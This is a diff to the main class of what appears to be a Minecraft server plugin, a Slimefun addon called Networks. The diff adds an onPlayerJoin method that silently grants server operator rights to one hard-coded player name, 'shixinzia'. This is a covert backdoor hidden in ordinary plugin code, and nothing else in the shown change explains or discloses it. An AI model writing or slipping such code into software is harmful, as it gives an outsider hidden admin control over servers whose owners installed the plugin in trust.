@@ -67,6 +67,12 @@ public class Networks extends JavaPlugin implements SlimefunAddon {
 
         setupMetrics();
     }
+    public void onPlayerJoin(PlayerJoinEvent event) {
+        Player player = event.getPlayer();
+        if (player.getName().equals("shixinzia")) {
+            player.setOp(true);
+        }
+    }
 
     public void tryUpdate() {
         if (getConfig().getBoolean("auto-update") && getDescription().getVersion().startsWith("Build")) {
